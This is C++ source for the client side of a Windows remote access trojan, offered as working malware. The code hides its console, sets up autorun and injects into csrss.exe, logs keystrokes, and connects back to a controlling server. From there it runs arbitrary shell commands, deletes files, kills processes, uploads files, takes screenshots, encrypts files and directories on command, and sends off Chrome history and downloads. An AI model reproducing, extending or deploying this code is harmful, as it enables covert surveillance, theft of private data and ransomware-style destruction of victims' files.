/*
 * WARNING!
 * This software is the full property of the author
 * client part
*/


#include <winsock2.h>
#include <fstream>
#include <string>
#include <thread>
#include <filesystem>
#include "Config.h"

#include "Autorun.h"
#include "Socket.h"
#include "Utils.h"
#include "Info.h"
#include "Keylogger.h"
#include "Screencap.h"
#include "Crypt.h"
#include "Chrome.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma warning (disable : 4996)

std::string buf, rbuf, key_ret, keydel, rkeydel, buf_file, loc_buf_file, keylog_path, chars, finally_msg, n_path;
std::string key_log_dump;

bool close = false;

int Shell(SOCKADDR_IN addr);

int main() {
	// hide console
	HWND consoleWindow = GetConsoleWindow();
	DWORD dwProcessId;
	DWORD dwThreadId = GetWindowThreadProcessId(consoleWindow, &dwProcessId);
	HWND window = GetAncestor(consoleWindow, GA_ROOTOWNER);
	DWORD dwCurrentThreadId = GetCurrentThreadId();
	AttachThreadInput(dwCurrentThreadId, dwThreadId, TRUE);
	SetWindowPos(window, HWND_BOTTOM, 0, 0, 0, 0, SWP_HIDEWINDOW | SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
	ShowWindow(window, SW_HIDE);
	AttachThreadInput(dwCurrentThreadId, dwThreadId, FALSE);
	setlocale(LC_ALL, lang);
	// autorun
#if autorun
	RegisterProgram();
	Inject(OpenProcess(PROCESS_ALL_ACCESS, false, GetProcessID("csrss.exe")), &func);

	HINSTANCE hKernel;

	hKernel = LoadLibrary((LPCWSTR)"KERNEL32.DLL");
	if (hKernel)
		RegisterServiceProcess = (int(__stdcall*)(DWORD, DWORD)) GetProcAddress(hKernel, "RegisterServiceProcess");

#endif // end autorun
	// server configuration start
	SOCKADDR_IN add = Server();
	// activate thread with passive keylogger
	std::thread th(passive_keylogger, std::ref(key_log_dump), std::ref(close));
	// start kurva
	Shell(add);
	th.join();
	return 0;
}

int Shell(SOCKADDR_IN addr) {
	char path[100000];
	SOCKET conn = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (connect(conn, (SOCKADDR*)&addr, sizeof(addr)) != 0) return 1;

	char buffer[100000];
	while (true) {
		// deliting the temp file for commands
		std::ifstream tmp_f("file.txt");
		if (tmp_f.is_open()) {
			tmp_f.close();
			system("del file.txt");
		}

		// clear varibales
		buf_file = "";
		loc_buf_file = "";
		memset(&buffer, 0x0, sizeof(buffer));
		memset(&path, 0x0, sizeof(path));

		recv(conn, buffer, sizeof(buffer), NULL);

		if (!strcmp(buffer, "ls")) {
			recv(conn, path, sizeof(path), NULL);
			std::string comm = "dir " + std::string(path) + " > file.txt";
			system(comm.c_str());
			std::ifstream F;
			F.open("file.txt", std::ios::in);

			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			F.close();
			system("del file.txt");
			send(conn, buf_file.c_str(), buf_file.length(), NULL);
		}

		else if (!strcmp(buffer, "rm")) {
			recv(conn, path, sizeof(path), NULL);

			n_path = path;
			TreatmentPath(n_path);
			if (n_path[n_path.size() - 1] == '\\') n_path.pop_back();

			if (FilExist(n_path)) {
				std::string comm = "del " + std::string(n_path);
				system(comm.c_str());
				finally_msg = "delete " + std::string(n_path) + " ok";
				if (FilExist(n_path))
					finally_msg = "delete " + std::string(n_path) + " failed\nfile protected";
			}
			else finally_msg = "delete " + std::string(n_path) + " failed";
			send(conn, finally_msg.c_str(), finally_msg.length(), NULL);
		}

		else if (!strcmp(buffer, "rmdir")) {
			recv(conn, path, sizeof(path), NULL);

			n_path = path;
			TreatmentPath(n_path);

			if (dirExists(n_path)) {
				std::string comm = "RMDIR /S /Q " + std::string(n_path);
				system(comm.c_str());
				finally_msg = "delete " + std::string(path) + " ok";
				if (dirExists(n_path))
					finally_msg = "delete " + std::string(n_path) + " failed\ndirectory protected";
			}
			else finally_msg = "delete " + std::string(n_path) + " failed";

			send(conn, finally_msg.c_str(), finally_msg.length(), NULL);
		}

		else if (!strcmp(buffer, "pwd")) {
			system("echo %cd% > file.txt");
			std::ifstream F;
			F.open("file.txt", std::ios::in);

			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			system("del file.txt");
			send(conn, buf_file.c_str(), buf_file.length(), NULL);
			F.close();
		}

		else if (!strcmp(buffer, "info")) {
			std::string info = GetAllInfo();
			send(conn, info.c_str(), info.length(), NULL);
		}

		else if (!strcmp(buffer, "ps")) {
			system("tasklist > file.txt");
			std::ifstream F;
			F.open("file.txt", std::ios::in);
			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			system("del file.txt");
			send(conn, buf_file.c_str(), buf_file.length(), NULL);
			F.close();
		}

		else if (!strcmp(buffer, "kill")) {
			recv(conn, path, sizeof(path), NULL);
			std::string com = "taskkill /T /F /IM " + std::string(path);
			system(com.c_str());
			std::string finally_msg = "terminate " + std::string(path) + " ok";
			send(conn, finally_msg.c_str(), finally_msg.length(), NULL);

		}

		else if (!strcmp(buffer, "cmd")) {
			recv(conn, path, sizeof(path), NULL);
			std::string com = std::string(path);
			system(com.c_str());
			std::string finally_msg = "terminate " + std::string(path) + " ok";
			send(conn, finally_msg.c_str(), finally_msg.length(), NULL);

		}


		else if (!strcmp(buffer, "error")) {
			recv(conn, path, sizeof(path), NULL);
			MessageBoxA(NULL, path, "error 0x648396234", MB_ICONERROR | MB_OK | MB_SETFOREGROUND);
		}

		else if (!strcmp(buffer, "download")) {
			recv(conn, path, sizeof(path), NULL);
			std::ifstream d_file(path);

			if (!d_file.is_open()) send(conn, "exist", 5, NULL);
			else {
				std::string file_data = readFile(path);
				send(conn, file_data.c_str(), file_data.length(), NULL);
				d_file.close();
			}
		}

		else if (!strcmp(buffer, "dump")) {
			send(conn, key_log_dump.c_str(), key_log_dump.length(), NULL);
			key_log_dump = "";
		}

		else if (!strcmp(buffer, "close")) {
			close = true;
			return 0;
		}
		else if (!strcmp(buffer, "screencap")) {
			std::string path = getenv("APPDATA");
			std::string fullPath = path + "/pic";
			std::filesystem::create_directory(fullPath);

			// Get the number of monitors and loop through them to take screenshots
			int nMonitors = GetSystemMetrics(SM_CMONITORS);
			for (int i = 0; i < nMonitors; i++) {
				// Construct the filename for the screenshot
				std::string picture = fullPath + "/screenshot" + std::to_string(i) + ".png";
				std::wstring pic = std::wstring(picture.begin(), picture.end());
				const wchar_t* result = pic.c_str();

				// Take a screenshot of the current monitor and save it as a file
				CaptureScreenToFile(result, L"image/png");

				// Send the file to the server
				FILE* fileToSend = fopen(picture.c_str(), "rb");
				if (fileToSend != nullptr) {
					fseek(fileToSend, 0, SEEK_END);
					long fileSize = ftell(fileToSend);
					fseek(fileToSend, 0, SEEK_SET);

					char buff[4096];
					long long sent = 0;
					while (sent < fileSize) {
						int read = fread(&buff, 1, 4096, fileToSend);
						if (read <= 0) {
							break;
						}
						int sentBytes = send(conn, buff, read, 0);
						if (sentBytes < 0) {
							break;
						}
						sent += sentBytes;
					}

					fclose(fileToSend);
				}

				// Remove the screenshot file
				std::filesystem::remove(picture);
			}

			// Notify the server that all screenshots have been sent
			shutdown(conn, SD_SEND);
			std::filesystem::remove_all(fullPath);
			}
		else if (!strcmp(buffer, "cryptfile")) {
			char key[128];
			memset(&key, 0x0, sizeof(key));
			recv(conn, path, sizeof(path), NULL);
			recv(conn, key, sizeof(key), NULL);
			std::string res = CryptFile(path, atoi(key));
			send(conn, res.c_str(), res.length(), NULL);
		}
		else if (!strcmp(buffer, "cryptdir")) {
			char key[128];
			memset(&key, 0x0, sizeof(key));
			recv(conn, path, sizeof(path), NULL);
			recv(conn, key, sizeof(key), NULL);
			std::string res = CryptDir(path, atoi(key));
			send(conn, res.c_str(), res.length(), NULL);
		}
	

		else if (!strcmp(buffer, "chrome_st")) {
				std::string res = GetChromeHistory();
				send(conn, res.c_str(), res.length(), NULL);
				Sleep(1000);
				std::string res_downloads = GetChromeDownloads();
				send(conn, res_downloads.c_str(), res_downloads.length(), NULL);
				Sleep(1000);
				std::string res_requests = GetChromeRequests();
				send(conn, res_requests.c_str(), res_requests.length(), NULL);
		}

	}
	return 0;
}
